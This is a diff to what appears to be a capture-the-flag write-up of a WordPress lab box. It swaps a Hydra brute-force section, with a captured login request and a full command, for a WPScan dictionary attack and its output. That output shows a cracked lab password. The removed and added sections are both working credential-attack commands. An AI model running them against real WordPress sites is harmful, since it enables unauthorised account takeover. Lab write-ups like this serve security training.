@@ -248,32 +248,29 @@ Found two users:
     - kwheel
     - bjoel
 
-Cracking WordPress Passwords with Hydra:
+Cracking WordPress Passwords with wpscan:
 
-Let's attempt to brute-force the password for the user kwheel. First, we use Burp Suite's proxy to capture the POST request data.
+Cracking WordPress Passwords with WPScan
 
-```
-log=kwheel&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1
-```
-
-Next, we'll use the captured data to construct the following command:
+WPScan can be used to perform password cracking attacks on WordPress sites. 
+Below is an example of how to perform a dictionary attack using WPScan with a wordlist:
 
 ```
-hydra -l kwheel -P /usr/share/wordlists/rockyou.txt -u -f 10.10.110.235 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.110.235%2Fwp-admin%2F&testcookie=1:test" -V
-```
-Command Breakdown
+$ wpscan --url http://blog.thm/wp-login.php --passwords /usr/share/wordlists/rockyou.txt 
 
-    -l kwheel: Specifies the username to test, in this case, kwheel.
-    -P /usr/share/wordlists/rockyou.txt: Specifies the password list to use, in this case, rockyou.txt.
-    -u: Ensures that Hydra attempts each username/password pair without any delays.
-    -f: Tells Hydra to stop after the first successful login attempt.
-    10.10.110.235: The target IP address of the website.
-    http-post-form: Specifies that the attack is targeting an HTTP POST login form.
-    /wp-login.php: The path to the WordPress login form.
-    log=^USER^&pwd=^PASS^&wp-submit=Log+In: This is the POST data, where ^USER^ and ^PASS^ are placeholders for the username and password.
-    redirect_to=http%3A%2F%2F10.10.110.235%2Fwp-admin%2F&testcookie=1: Additional form fields that WordPress expects.
-    test: The string that indicates a failed login. This should be replaced with the actual failure message (like "Invalid username" or "Incorrect password").
-    -V: Enables verbose mode to show detailed output.
+( ... )
+
+[+] Performing password attack on Xmlrpc against 4 user/s
+[SUCCESS] - kwheel / cutiepie1                                                                                                                                        
+^Cying Billy Joel / jackie Time: 00:00:24 <                                                                                  
+ | Username: kwheel, Password: cutiepie1
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.                                            
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+```
+
+
 
 
 
